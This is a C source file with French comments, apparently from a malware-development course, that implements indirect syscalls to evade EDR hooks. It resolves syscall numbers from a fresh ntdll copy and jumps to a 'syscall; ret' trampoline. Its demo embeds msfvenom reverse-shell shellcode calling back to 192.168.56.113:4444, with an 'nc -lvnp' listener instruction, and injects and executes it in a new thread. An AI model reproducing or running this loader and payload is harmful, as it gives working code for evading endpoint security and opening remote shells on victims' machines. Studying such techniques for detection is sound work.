/*
 * ============================================================================
 * SYSCALLS INDIRECTS - ÉVASION EDR AVANCÉE
 * ============================================================================
 *
 * Cette implémentation est plus furtive que les syscalls directs.
 * Au lieu d'avoir l'instruction "syscall" dans notre code (détectable),
 * on utilise l'instruction syscall qui existe déjà dans ntdll.dll.
 *
 * PRINCIPE DÉTAILLÉ :
 *
 * 1. Charger une copie fraîche de ntdll.dll depuis le disque
 *    └─> Aucun hook EDR car elle n'est pas encore chargée en mémoire
 *
 * 2. Parser le PE (Portable Executable) pour trouver les fonctions
 *    └─> Lire l'Export Directory Table
 *    └─> Chercher NtAllocateVirtualMemory, NtWriteVirtualMemory, etc.
 *
 * 3. Extraire le numéro de syscall (SSN)
 *    └─> Les premiers bytes de chaque fonction contiennent :
 *        mov r10, rcx        ; 4C 8B D1
 *        mov eax, 0xXX       ; B8 XX 00 00 00  ← SSN ici !
 *        syscall             ; 0F 05
 *        ret                 ; C3
 *
 * 4. Trouver une instruction "syscall; ret" dans ntdll
 *    └─> On cherche les bytes : 0F 05 C3
 *    └─> Cette adresse sera notre "trampoline"
 *
 * 5. Exécuter le syscall indirect :
 *    - Préparer les registres (R10, RAX avec SSN)
 *    - Jump vers l'adresse "syscall; ret" de ntdll
 *    - L'EDR voit un appel depuis ntdll → légitime !
 *
 * AVANTAGES PAR RAPPORT AUX SYSCALLS DIRECTS :
 * ✅ Pas d'instruction syscall dans notre code malveillant
 * ✅ Call stack semble légitime (appel depuis ntdll)
 * ✅ Détection statique plus difficile
 * ✅ Compatibilité avec toutes les versions Windows (extraction dynamique)
 *
 * COMPILATION :
 * cd "c:\Users\zak28\OneDrive\Bureau\CETP\Malware Development\01_Projects\Syscall\Code"
 * gcc -c dosyscall.S -o dosyscall.o
 * gcc -Wall -O2 -DCOMPILE_DEMO_INDIRECT -c syscalls_indirect.c -o syscalls_indirect.o
 * gcc syscalls_indirect.o dosyscall.o -o syscalls_indirect.exe -lntdll -s
 * 
 * ou : gcc -c dosyscall.S -o dosyscall.o && gcc -Wall -O2 -DCOMPILE_DEMO_INDIRECT -c syscalls_indirect.c -o syscalls_indirect.o && gcc syscalls_indirect.o dosyscall.o -o syscalls_indirect.exe -lntdll -s
 *
 * ============================================================================
 */

#include <windows.h>
#include <stdio.h>
#include "syscalls.h"

// ============================================================================
// NOTE: Les structures PE sont déjà définies dans windows.h
// ============================================================================
// IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_EXPORT_DIRECTORY, etc.
// sont disponibles via l'include de windows.h

// ============================================================================
// VARIABLES GLOBALES POUR LES SYSCALLS INDIRECTS
// ============================================================================

// Structure pour stocker les informations d'un syscall
typedef struct _SYSCALL_INFO
{
    DWORD ssn;            // System Service Number
    PVOID syscallAddress; // Adresse de l'instruction "syscall; ret"
} SYSCALL_INFO, *PSYSCALL_INFO;

// Table des syscalls que nous utilisons
static SYSCALL_INFO g_SyscallTable[6] = {0};

// Indices dans la table
#define IDX_NtAllocateVirtualMemory 0
#define IDX_NtWriteVirtualMemory 1
#define IDX_NtProtectVirtualMemory 2
#define IDX_NtCreateThreadEx 3
#define IDX_NtWaitForSingleObject 4
#define IDX_NtClose 5

// Adresse de base de ntdll fraîche
static PVOID g_FreshNtdll = NULL;

// ============================================================================
// FONCTION POUR CHARGER UNE COPIE FRAÎCHE DE NTDLL
// ============================================================================

/*
 * LoadFreshNtdll
 * --------------
 * Charge ntdll.dll depuis le disque dans la mémoire
 * Cette copie n'a AUCUN hook EDR car elle n'est pas mappée par le loader
 *
 * PROCESSUS :
 * 1. Ouvrir C:\Windows\System32\ntdll.dll
 * 2. Lire tout le fichier en mémoire
 * 3. Cette copie est "propre" et peut servir de référence
 */
static BOOL LoadFreshNtdll()
{
    printf("[*] Loading fresh copy of ntdll.dll from disk...\n");

    // Construire le chemin vers ntdll.dll
    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    lstrcatA(ntdllPath, "\\ntdll.dll");

    printf("    Path: %s\n", ntdllPath);

    // Ouvrir le fichier
    HANDLE hFile = CreateFileA(
        ntdllPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open ntdll.dll: %lu\n", GetLastError());
        return FALSE;
    }

    // Obtenir la taille du fichier
    DWORD fileSize = GetFileSize(hFile, NULL);
    printf("    File size: %lu bytes\n", fileSize);

    // Allouer de la mémoire pour le fichier
    g_FreshNtdll = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_FreshNtdll)
    {
        printf("[-] Failed to allocate memory\n");
        CloseHandle(hFile);
        return FALSE;
    }

    // Lire le fichier en mémoire
    DWORD bytesRead;
    if (!ReadFile(hFile, g_FreshNtdll, fileSize, &bytesRead, NULL))
    {
        printf("[-] Failed to read ntdll.dll: %lu\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);

    printf("[+] Fresh ntdll.dll loaded at 0x%p\n\n", g_FreshNtdll);
    return TRUE;
}

// ============================================================================
// FONCTION POUR EXTRAIRE LE SSN D'UNE FONCTION
// ============================================================================

/*
 * GetSSNFromFunction
 * ------------------
 * Extrait le System Service Number (SSN) d'une fonction syscall
 *
 * STRUCTURE D'UNE FONCTION SYSCALL :
 *
 * NtAllocateVirtualMemory:
 *   4C 8B D1              mov r10, rcx        ; Sauvegarde RCX dans R10
 *   B8 18 00 00 00        mov eax, 0x18       ; ← SSN = 0x18 (offset +4)
 *   0F 05                 syscall              ; Instruction syscall
 *   C3                    ret                  ; Retour
 *
 * On va lire les 8 premiers bytes et extraire le SSN à l'offset +4
 */
static DWORD GetSSNFromFunction(PVOID functionAddress)
{
    BYTE *bytes = (BYTE *)functionAddress;

    // Vérifier la signature : mov r10, rcx (4C 8B D1)
    if (bytes[0] != 0x4C || bytes[1] != 0x8B || bytes[2] != 0xD1)
    {
        printf("[-] Invalid function signature\n");
        return 0;
    }

    // Vérifier : mov eax, imm32 (B8)
    if (bytes[3] != 0xB8)
    {
        printf("[-] Invalid mov eax instruction\n");
        return 0;
    }

    // Extraire le SSN (4 bytes après 0xB8)
    DWORD ssn = *(DWORD *)(bytes + 4);

    return ssn;
}

// ============================================================================
// FONCTION POUR TROUVER L'ADRESSE "SYSCALL; RET"
// ============================================================================

/*
 * FindSyscallAddress
 * ------------------
 * Cherche l'instruction "syscall; ret" (0F 05 C3) dans ntdll
 * Cette adresse servira de trampoline pour nos syscalls indirects
 *
 * POURQUOI ?
 * Au lieu d'avoir "syscall" dans notre code, on jump vers cette adresse
 * légitime dans ntdll. L'EDR voit un appel depuis ntdll → OK !
 */
static PVOID FindSyscallAddress(PVOID moduleBase)
{
    printf("[*] Searching for syscall instruction in ntdll...\n");

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);

    // Obtenir la section .text (code exécutable)
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    DWORD textSize = 0;
    PVOID textBase = NULL;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(section[i].Name, ".text", 5) == 0)
        {
            textBase = (BYTE *)moduleBase + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textBase)
    {
        printf("[-] .text section not found\n");
        return NULL;
    }

    printf("    .text section: 0x%p - 0x%p (%lu bytes)\n",
           textBase, (BYTE *)textBase + textSize, textSize);

    // Chercher les bytes : 0F 05 C3 (syscall; ret)
    BYTE *current = (BYTE *)textBase;
    BYTE *end = current + textSize - 2;

    while (current < end)
    {
        if (current[0] == 0x0F && current[1] == 0x05 && current[2] == 0xC3)
        {
            printf("[+] Found syscall instruction at: 0x%p\n\n", current);
            return current;
        }
        current++;
    }

    printf("[-] syscall instruction not found\n");
    return NULL;
}

// ============================================================================
// FONCTION POUR RÉSOUDRE UNE FONCTION PAR NOM
// ============================================================================

/*
 * GetFunctionAddressByName
 * ------------------------
 * Parse l'Export Directory Table pour trouver une fonction par son nom
 *
 * PROCESSUS :
 * 1. Trouver l'Export Directory dans le PE
 * 2. Parcourir le tableau des noms exportés
 * 3. Comparer avec le nom recherché
 * 4. Retourner l'adresse (RVA) de la fonction
 */
static PVOID GetFunctionAddressByName(PVOID moduleBase, const char *functionName)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);

    // Obtenir l'Export Directory
    DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)moduleBase + exportDirRva);

    // Tableaux des exports
    DWORD *addressOfFunctions = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfFunctions);
    DWORD *addressOfNames = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfNames);
    WORD *addressOfNameOrdinals = (WORD *)((BYTE *)moduleBase + exportDir->AddressOfNameOrdinals);

    // Parcourir les noms exportés
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
    {
        char *currentName = (char *)((BYTE *)moduleBase + addressOfNames[i]);

        // Comparer les noms
        if (lstrcmpA(currentName, functionName) == 0)
        {
            // Trouver l'ordinal
            WORD ordinal = addressOfNameOrdinals[i];

            // Obtenir l'adresse RVA
            DWORD functionRva = addressOfFunctions[ordinal];

            // Retourner l'adresse absolue
            return (BYTE *)moduleBase + functionRva;
        }
    }

    return NULL;
}

// ============================================================================
// INITIALISATION DES SYSCALLS INDIRECTS
// ============================================================================

/*
 * InitializeIndirectSyscalls
 * --------------------------
 * Initialise tout le système de syscalls indirects :
 * 1. Charge ntdll fraîche
 * 2. Trouve l'adresse syscall
 * 3. Extrait les SSN de chaque fonction
 */
BOOL InitializeIndirectSyscalls()
{
    printf("=======================================================\n");
    printf("  INITIALISATION DES SYSCALLS INDIRECTS\n");
    printf("=======================================================\n\n");

    // ÉTAPE 1 : Charger ntdll fraîche
    if (!LoadFreshNtdll())
    {
        return FALSE;
    }

    // ÉTAPE 2 : Trouver l'adresse syscall (dans ntdll mappée en mémoire, pas la fraîche)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PVOID syscallAddress = FindSyscallAddress(hNtdll);
    if (!syscallAddress)
    {
        return FALSE;
    }

    // ÉTAPE 3 : Résoudre chaque fonction et extraire son SSN
    const char *functionNames[] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtWaitForSingleObject",
        "NtClose"};

    printf("[*] Resolving syscall numbers...\n");

    for (int i = 0; i < 6; i++)
    {
        // Trouver la fonction dans ntdll fraîche
        PVOID functionAddress = GetFunctionAddressByName(g_FreshNtdll, functionNames[i]);
        if (!functionAddress)
        {
            printf("[-] Failed to find %s\n", functionNames[i]);
            return FALSE;
        }

        // Extraire le SSN
        DWORD ssn = GetSSNFromFunction(functionAddress);
        if (ssn == 0)
        {
            printf("[-] Failed to extract SSN from %s\n", functionNames[i]);
            return FALSE;
        }

        // Stocker dans la table
        g_SyscallTable[i].ssn = ssn;
        g_SyscallTable[i].syscallAddress = syscallAddress;

        printf("    [%d] %-30s SSN: 0x%04lX\n", i, functionNames[i], ssn);
    }

    printf("\n[+] Indirect syscalls initialized successfully!\n\n");
    return TRUE;
}

// ============================================================================
// NETTOYAGE
// ============================================================================

VOID CleanupIndirectSyscalls()
{
    if (g_FreshNtdll)
    {
        VirtualFree(g_FreshNtdll, 0, MEM_RELEASE);
        g_FreshNtdll = NULL;
    }
}

// ============================================================================
// FONCTIONS UTILITAIRES D'AFFICHAGE
// ============================================================================

VOID PrintError(const char *function, NTSTATUS status)
{
    printf("[-] %s failed with status: 0x%08lX\n", function, status);
}

VOID PrintSuccess(const char *message)
{
    printf("[+] %s\n", message);
}

// ============================================================================
// FONCTION ASSEMBLEUR POUR SYSCALL INDIRECT
// ============================================================================

/*
 * DoSyscall - Fonction assembleur externe
 * ----------------------------------------
 * Implémentée dans dosyscall.asm pour éviter les problèmes de syntaxe
 * Effectue un syscall indirect via une adresse dans ntdll
 *
 * Paramètres:
 *   ssn         : System Service Number
 *   syscallAddr : Adresse de l'instruction syscall dans ntdll
 *   arg1-arg6   : Arguments du syscall
 *
 * Retourne: NTSTATUS du syscall
 */
extern NTSTATUS DoSyscall(
    DWORD ssn,
    PVOID syscallAddr,
    PVOID arg1,
    PVOID arg2,
    PVOID arg3,
    PVOID arg4,
    PVOID arg5,
    PVOID arg6);

/*
 * DoSyscall11 - Version étendue pour 11 arguments (NtCreateThreadEx)
 */
extern NTSTATUS DoSyscall11(
    DWORD ssn,
    PVOID syscallAddr,
    PVOID arg1,
    PVOID arg2,
    PVOID arg3,
    PVOID arg4,
    PVOID arg5,
    PVOID arg6,
    PVOID arg7,
    PVOID arg8,
    PVOID arg9,
    PVOID arg10,
    PVOID arg11);

// ============================================================================
// IMPLÉMENTATION DES SYSCALLS INDIRECTS
// ============================================================================

/*
 * NtAllocateVirtualMemory_Indirect
 * --------------------------------
 * Version indirecte : utilise le SSN extrait et jump vers ntdll
 */
NTSTATUS NtAllocateVirtualMemory_Indirect(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtAllocateVirtualMemory];

    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        (PVOID)ProcessHandle,
        (PVOID)BaseAddress,
        (PVOID)ZeroBits,
        (PVOID)RegionSize,
        (PVOID)(ULONG_PTR)AllocationType,
        (PVOID)(ULONG_PTR)Protect);
}

NTSTATUS NtWriteVirtualMemory_Indirect(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWriteVirtualMemory];

    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        (PVOID)ProcessHandle,
        BaseAddress,
        Buffer,
        (PVOID)NumberOfBytesToWrite,
        (PVOID)NumberOfBytesWritten,
        NULL);
}

NTSTATUS NtProtectVirtualMemory_Indirect(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtProtectVirtualMemory];

    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        (PVOID)ProcessHandle,
        (PVOID)BaseAddress,
        (PVOID)RegionSize,
        (PVOID)(ULONG_PTR)NewProtect,
        (PVOID)OldProtect,
        NULL);
}

NTSTATUS NtCreateThreadEx_Indirect(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtCreateThreadEx];

    return DoSyscall11(
        info->ssn,
        info->syscallAddress,
        (PVOID)ThreadHandle,
        (PVOID)DesiredAccess,
        (PVOID)ObjectAttributes,
        (PVOID)ProcessHandle,
        (PVOID)StartRoutine,
        (PVOID)Argument,
        (PVOID)(ULONG_PTR)CreateFlags,
        (PVOID)ZeroBits,
        (PVOID)StackSize,
        (PVOID)MaximumStackSize,
        (PVOID)AttributeList);
}

NTSTATUS NtWaitForSingleObject_Indirect(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWaitForSingleObject];

    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        (PVOID)Handle,
        (PVOID)(ULONG_PTR)Alertable,
        (PVOID)Timeout,
        NULL, NULL, NULL);
}

NTSTATUS NtClose_Indirect(
    HANDLE Handle)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtClose];

    return DoSyscall(
        info->ssn,
        info->syscallAddress,
        (PVOID)Handle,
        NULL, NULL, NULL, NULL, NULL);
}

// ============================================================================
// EXEMPLE D'UTILISATION
// ============================================================================

#ifdef COMPILE_DEMO_INDIRECT

int main()
{
    printf("=======================================================\n");
    printf("  SYSCALLS INDIRECTS - Démonstration\n");
    printf("=======================================================\n\n");

    // INITIALISATION
    if (!InitializeIndirectSyscalls())
    {
        printf("[-] Failed to initialize indirect syscalls\n");
        return 1;
    }

    // Shellcode msfvenom: windows/x64/shell_reverse_tcp LHOST=192.168.56.113 LPORT=4444
    // ATTENTION: Démarrer listener avant: nc -lvnp 4444 sur 192.168.56.113
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
        "\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x38\x71"
        "\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
        "\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
        "\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
        "\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
        "\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
        "\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
        "\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
        "\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
        "\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
        "\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
        "\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
        "\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
        "\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
        "\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
        "\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
    
    SIZE_T shellcodeSize = sizeof(shellcode);
    printf("    [*] Reverse shell shellcode: %zu bytes (192.168.56.113:4444)\n", shellcodeSize);
    printf("    [!] Make sure listener is active: nc -lvnp 4444\n\n");

    // INJECTION AVEC SYSCALLS INDIRECTS
    printf("[*] Injecting shellcode using indirect syscalls...\n\n");

    // Allouer
    PVOID baseAddress = NULL;
    SIZE_T regionSize = shellcodeSize;

    printf("[DEBUG] About to call NtAllocateVirtualMemory_Indirect\n");
    printf("        shellcodeSize=%llu, regionSize=%llu\n", (unsigned long long)shellcodeSize, (unsigned long long)regionSize);

    NTSTATUS status = NtAllocateVirtualMemory_Indirect(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    printf("[DEBUG] Returned from NtAllocateVirtualMemory_Indirect: status=0x%08lX\n", status);

    if (!NT_SUCCESS(status))
    {
        PrintError("NtAllocateVirtualMemory_Indirect", status);
        CleanupIndirectSyscalls();
        return 1;
    }
    PrintSuccess("Memory allocated");
    printf("    Address: 0x%p\n\n", baseAddress);
    
    // DEBUG: Vérifier le shellcode avant l'écriture
    printf("[DEBUG] Shellcode buffer address: 0x%p, size: %zu\n", shellcode, shellcodeSize);
    printf("[DEBUG] First 20 bytes: ");
    for (size_t i = 0; i < 20 && i < shellcodeSize; i++) {
        printf("%02X ", (unsigned char)shellcode[i]);
    }
    printf("\n\n");

    // Écrire
    printf("[DEBUG] About to call NtWriteVirtualMemory_Indirect\n");
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory_Indirect(
        GetCurrentProcess(),
        baseAddress,
        shellcode,
        shellcodeSize,
        &bytesWritten);
    
    printf("[DEBUG] Returned from NtWriteVirtualMemory_Indirect: status=0x%08lX\n", status);
    printf("        bytesWritten=%zu\n\n", bytesWritten);

    if (!NT_SUCCESS(status))
    {
        PrintError("NtWriteVirtualMemory_Indirect", status);
        CleanupIndirectSyscalls();
        return 1;
    }
    PrintSuccess("Shellcode written");

    // Protéger
    ULONG oldProtect;
    status = NtProtectVirtualMemory_Indirect(
        GetCurrentProcess(),
        &baseAddress,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect);

    if (!NT_SUCCESS(status))
    {
        PrintError("NtProtectVirtualMemory_Indirect", status);
        CleanupIndirectSyscalls();
        return 1;
    }
    PrintSuccess("Memory protection changed to RX");

    // Créer un thread
    printf("[DEBUG] About to call NtCreateThreadEx_Indirect\n");
    printf("        StartAddress=0x%p\n\n", baseAddress);
    
    HANDLE hThread;
    status = NtCreateThreadEx_Indirect(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        baseAddress,
        NULL,
        0,
        0,
        0,
        0,
        NULL);
    
    printf("[DEBUG] Returned from NtCreateThreadEx_Indirect: status=0x%08lX\n", status);

    if (!NT_SUCCESS(status))
    {
        PrintError("NtCreateThreadEx_Indirect", status);
        CleanupIndirectSyscalls();
        return 1;
    }
    PrintSuccess("Thread created and shellcode executed!");

    // Attendre et nettoyer
    printf("[DEBUG] Waiting for thread...\n");
    NtWaitForSingleObject_Indirect(hThread, FALSE, NULL);
    printf("[DEBUG] Thread finished\n");
    NtClose_Indirect(hThread);

    CleanupIndirectSyscalls();

    printf("\n[+] Démonstration terminée avec succès !\n");
    return 0;
}

#endif // COMPILE_DEMO_INDIRECT
